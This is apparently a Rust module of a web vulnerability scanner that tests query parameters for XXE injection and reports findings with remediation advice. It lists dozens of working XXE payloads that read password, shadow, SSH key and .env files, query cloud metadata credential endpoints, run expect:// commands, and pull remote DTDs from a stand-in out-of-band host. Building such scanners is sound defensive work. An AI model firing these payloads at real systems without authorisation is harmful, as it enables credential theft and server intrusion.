//! XXE (XML External Entity) injection detection.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

const XXE_ERROR_PATTERNS: &[&str] = &[
    r"(?i)Entity not found",
    r"(?i)External entity",
    r"(?i)XML parser error",
    r"(?i)DOCTYPE",
    r"(?i)ENTITY",
    r"(?i)SAXParseException",
    r"(?i)javax\.xml",
    r"(?i)org\.apache\.xerces",
    r"(?i)com\.sun\.org\.apache",
    r"(?i)org\.xml\.sax",
    r"(?i)XMLReader",
    r"(?i)XMLStreamException",
    r"(?i)XMLStreamConstants",
    r"(?i)DocumentBuilderFactory",
    r"(?i)TransformerFactory",
    r"(?i)XMLDecoder",
    r"(?i)javax\.xml\.parsers",
    r"(?i)org\.w3c\.dom",
    r"(?i)org\.jdom",
    r"(?i)org\.dom4j",
    r"(?i)com\.thoughtworks\.xstream",
    r"(?i)Unmarshalling Error",
    r"(?i)unmarshaller",
    r"(?i)JDOMException",
    r"(?i)XmlException",
    r"(?i)Xerces-J",
    r"(?i)error parsing xml",
    r"(?i)invalid xml",
    r"(?i)malformed xml",
    r"(?i)undefined entity",
    r"(?i)referred entity",
    r"(?i)ParserConfigurationException",
    r"(?i)SAXException",
    r"(?i)Failed to parse",
    r"(?i)XMLHTTP",
    r"(?i)MSXML",
    r"(?i)XmlDocument",
    r"(?i)System\.Xml",
    r"(?i)XmlSerializer",
    r"(?i)XmlReaderSettings",
    r"(?i)XmlTextReader",
    r"(?i)XPathNavigator",
    r"(?i)DOMException",
    r"(?i)libxml2",
    r"(?i)libxml",
    r"(?i)xmlParseEntityRef",
    r"(?i)Expat",
    r"(?i)XML::Parser",
    r"(?i)XMLReaderError",
    r"(?i)org\.apache\.xalan",
    r"(?i)XMLType",
    r"(?i)DBMS_XMLPARSER",
    r"(?i)XMLPARSE",
    r"(?i)XMLTYPE",
    r"(?i)XMLSERIALIZE",
    r"(?i)XmlPullParser",
    r"(?i)kxml",
    r"(?i)STaX",
    r"(?i)OWASP ESAPI",
    r"(?i)XmlEntity",
    r"(?i)DTDEntityReference",
    r"(?i)InvalidXmlException",
];

const XXE_BLIND_INDICATORS: &[&str] = &[
    r"\bssrf\b",
    r"\back\b",
    r"\boob\b",
    r"\bdns\b",
    r"\binteraction\b",
    r"\breceived\b",
    r"\bresponse\b",
    r"\bcallback\b",
    r"\bfetch\b",
];

/// Classic in-band XXE payloads (file read, SSRF, RCE probes).
const XXE_PAYLOADS: &[(&str, &str)] = &[
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        "/etc/passwd",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>"#,
        "php://",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>"#,
        "169.254",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>"#,
        "win.ini",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>"#,
        "uid=",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>"#,
        "root:",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>"#,
        "root:",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>"#,
        "HOME=",
    ),
    // ── Extended classic payloads ─────────────────────────────────────────
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        "root:",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>"#,
        "localhost",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/group">]><root>&xxe;</root>"#,
        "root",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>"#,
        "hostname",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/version">]><root>&xxe;</root>"#,
        "linux",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/issue">]><root>&xxe;</root>"#,
        "Kernel",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/redhat-release">]><root>&xxe;</root>"#,
        "release",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/debian_version">]><root>&xxe;</root>"#,
        "buster",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/os-release">]><root>&xxe;</root>"#,
        "PRETTY_NAME",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/lsb-release">]><root>&xxe;</root>"#,
        "DISTRIB",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><root>&xxe;</root>"#,
        "cmdline",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/status">]><root>&xxe;</root>"#,
        "Name:",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/cpuinfo">]><root>&xxe;</root>"#,
        "processor",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/meminfo">]><root>&xxe;</root>"#,
        "MemTotal",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">]><root>&xxe;</root>"#,
        "php",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">]><root>&xxe;</root>"#,
        "DB_PASSWORD",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><root>&xxe;</root>"#,
        "config",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/.env">]><root>&xxe;</root>"#,
        "SECRET",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]><root>&xxe;</root>"#,
        "PRIVATE KEY",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/authorized_keys">]><root>&xxe;</root>"#,
        "ssh-",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/log/auth.log">]><root>&xxe;</root>"#,
        "sshd",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">]><root>&xxe;</root>"#,
        "apache",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/log/nginx/access.log">]><root>&xxe;</root>"#,
        "nginx",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///tmp/test.txt">]><root>&xxe;</root>"#,
        "tmp",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///dev/random">]><root>&xxe;</root>"#,
        "random",
    ),
    // ── Windows payloads ──────────────────────────────────────────────────
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>"#,
        "localhost",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><root>&xxe;</root>"#,
        "system",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>"#,
        "fonts",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><root>&xxe;</root>"#,
        "configuration",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><root>&xxe;</root>"#,
        "boot loader",
    ),
    // ── SSRF / cloud metadata ─────────────────────────────────────────────
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>"#,
        "AccessKeyId",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/">]><root>&xxe;</root>"#,
        "user-data",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/1.0/meta-data/">]><root>&xxe;</root>"#,
        "instance-id",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><root>&xxe;</root>"#,
        "compute",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.170.2/v2/credentials/">]><root>&xxe;</root>"#,
        "AWS_CONTAINER",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/">]><root>&xxe;</root>"#,
        "aliyun",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>"#,
        "metadata",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://metadata.tencentyun.com/latest/meta-data/">]><root>&xxe;</root>"#,
        "tencent",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]><root>&xxe;</root>"#,
        "192.168",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>"#,
        "127.0.0.1",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8000/">]><root>&xxe;</root>"#,
        "127.0.0.1",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:9000/">]><root>&xxe;</root>"#,
        "127.0.0.1",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost/">]><root>&xxe;</root>"#,
        "localhost",
    ),
    // ── PHP wrappers ──────────────────────────────────────────────────────
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>"#,
        "base64",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>"#,
        "base64",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>"#,
        "base64",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://input">]><root>&xxe;</root>"#,
        "php",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://memory">]><root>&xxe;</root>"#,
        "php",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://temp">]><root>&xxe;</root>"#,
        "php",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>"#,
        "uid",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>"#,
        "whoami",
    ),
    // ── Blind / parameter entity payloads ─────────────────────────────────
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://oob.test/xxe.dtd">%remote;%param1;]><root>&external;</root>"#,
        "oob",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://oob.test/xxe.dtd">%dtd;]><root>&send;</root>"#,
        "oob",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://oob.test/xxe.dtd">%xxe;]>"#,
        "oob",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://oob.test/e.dtd">%ext;]><root>&content;</root>"#,
        "oob",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % a SYSTEM "file:///etc/passwd">%a;]>"#,
        "root:",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % b SYSTEM "file:///etc/hosts">%b;]>"#,
        "localhost",
    ),
    // ── XInclude ──────────────────────────────────────────────────────────
    (
        r#"<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>"#,
        "root:",
    ),
    (
        r#"<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="xml" href="http://169.254.169.254/latest/meta-data/"/></root>"#,
        "169.254",
    ),
    (
        r#"<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>"#,
        "root:",
    ),
    // ── SVG-based XXE (for upload endpoints) ──────────────────────────────
    (
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&xxe;</text></svg>"#,
        "root:",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"#,
        "localhost",
    ),
    // ── SOAP payloads ─────────────────────────────────────────────────────
    (
        r#"<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>]]></foo></soap:Body></soap:Envelope>"#,
        "root:",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><a>&xxe;</a></SOAP-ENV:Body></SOAP-ENV:Envelope>"#,
        "root:",
    ),
    // ── Office / OOXML entity payloads ────────────────────────────────────
    (
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        "root:",
    ),
    // ── UTF-16 / encoding tricks ──────────────────────────────────────────
    (
        r#"<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        "root:",
    ),
    (
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>"#,
        "root:",
    ),
    // ── Whitespace / newline normalization tricks ─────────────────────────
    (
        r#"<?xml version="1.0"?> <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <root> &xxe; </root>"#,
        "root:",
    ),
    (
        r#"<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"#,
        "root:",
    ),
    // ── Without XML declaration ───────────────────────────────────────────
    (
        r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        "root:",
    ),
    (
        r#"<!DOCTYPE root SYSTEM "http://oob.test/x.dtd"><root>&xxe;</root>"#,
        "oob",
    ),
    // ── Error-based XXE (trigger via missing entity) ──────────────────────
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><root>&xxe;</root>"#,
        "nonexistent",
    ),
    (
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&undefined_entity;</root>"#,
        "undefined",
    ),
];

pub async fn check_xxe(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let params: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    if params.is_empty() {
        return Ok(findings);
    }

    let xxe_payloads = XXE_PAYLOADS.iter().copied().collect::<Vec<_>>();

    for (param_name, _) in &params {
        for (payload, indicator) in &xxe_payloads {
            let mut test_url = url.clone();
            {
                let mut p = test_url.query_pairs_mut();
                p.clear();
                for (k, v) in &params {
                    p.append_pair(k, if k == param_name { payload } else { v });
                }
            }

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
            {
                let body_lower = response.body.to_lowercase();
                if body_lower.contains(indicator) || body_lower.contains("root:") {
                    let mut f = Finding::new(
                        format!(
                            "XXE detected in parameter '{}' — entity returned system file content",
                            param_name
                        ),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(611);
                    f.evidence.push(Evidence::redacted(
                        "xxe",
                        format!("Payload: {}", payload.chars().take(80).collect::<String>()),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Disable external entity parsing in XML parsers, or use a less featureful data format like JSON.".into();
                    f.references.push("https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing".into());
                    findings.push(f);
                    break;
                }

                for pattern in XXE_ERROR_PATTERNS {
                    if let Ok(re) = Regex::new(pattern)
                        && re.is_match(&response.body)
                    {
                        let mut f = Finding::new(
                            format!(
                                "Potential XXE in parameter '{}' — XML parser error detected",
                                param_name
                            ),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::High,
                            Confidence::Likely,
                            "grym-web-scanner",
                        );
                        f.categories.push("A05:2025-Injection".into());
                        f.cwe_ids.push(611);
                        f.evidence.push(Evidence::redacted(
                            "xxe-error",
                            format!(
                                "XML error pattern: {} with payload: {}",
                                pattern,
                                payload.chars().take(60).collect::<String>()
                            ),
                            response.body.chars().take(200).collect::<String>(),
                        ));
                        findings.push(f);
                        break;
                    }
                }
            }
        }
    }
    Ok(findings)
}
